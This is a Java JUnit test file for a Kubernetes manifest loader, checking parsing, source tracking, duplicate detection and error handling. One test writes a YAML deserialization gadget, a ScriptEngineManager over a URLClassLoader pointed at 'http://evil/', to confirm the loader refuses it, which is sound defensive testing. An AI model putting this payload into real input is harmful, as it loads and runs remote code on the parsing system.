package io.github.yashringe.drift.manifest;

import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.List;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

class ManifestLoaderTest {

    private static final Path MANIFESTS = Path.of("src/test/resources/manifests");
    private final ManifestLoader loader = new ManifestLoader("default");

    @Test
    void readsMultiDocumentFilesListsAndNestedFolders() {
        List<ResourceKey> keys = loader.load(MANIFESTS).stream().map(DesiredResource::key).toList();

        assertThat(keys).containsExactlyInAnyOrder(
                new ResourceKey("v1", "Namespace", null, "demo"),
                new ResourceKey("v1", "ConfigMap", "demo", "web-config"),
                new ResourceKey("apps/v1", "Deployment", "demo", "web"),
                new ResourceKey("v1", "Service", "demo", "web"),
                new ResourceKey("v1", "ServiceAccount", "default", "reporter"),
                new ResourceKey("rbac.authorization.k8s.io/v1", "ClusterRole", null, "drift-reader"),
                new ResourceKey("v1", "Secret", "demo", "api-token"));
    }

    @Test
    void remembersSourceFile() {
        DesiredResource deployment = loader.load(MANIFESTS).stream()
                .filter(r -> r.key().kind().equals("Deployment")).findFirst().orElseThrow();

        assertThat(deployment.source().getFileName()).hasToString("web.yaml");
    }

    @Test
    void refusesDuplicateObjects(@TempDir Path dir) throws IOException {
        Files.copy(MANIFESTS.resolve("app/web.yaml"), dir.resolve("a.yaml"));
        Files.copy(MANIFESTS.resolve("app/web.yaml"), dir.resolve("b.yaml"));

        assertThatThrownBy(() -> loader.load(dir)).isInstanceOf(ManifestException.class)
                .hasMessageContaining("defined twice");
    }

    @Test
    void refusesObjectsWithoutName(@TempDir Path dir) throws IOException {
        Files.writeString(dir.resolve("x.yaml"), "apiVersion: v1\nkind: ConfigMap\nmetadata: {}\n");

        assertThatThrownBy(() -> loader.load(dir)).isInstanceOf(ManifestException.class)
                .hasMessageContaining("metadata.name");
    }

    @Test
    void doesNotInstantiateJavaClassesFromYamlTags(@TempDir Path dir) throws IOException {
        Files.writeString(dir.resolve("evil.yaml"),
                "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://evil/\"]]]]\n");

        assertThatThrownBy(() -> loader.load(dir)).isInstanceOf(ManifestException.class)
                .hasMessageContaining("Invalid YAML");
    }

    @Test
    void failsForMissingFolder() {
        assertThatThrownBy(() -> loader.load(Path.of("does-not-exist"))).isInstanceOf(ManifestException.class);
    }
}
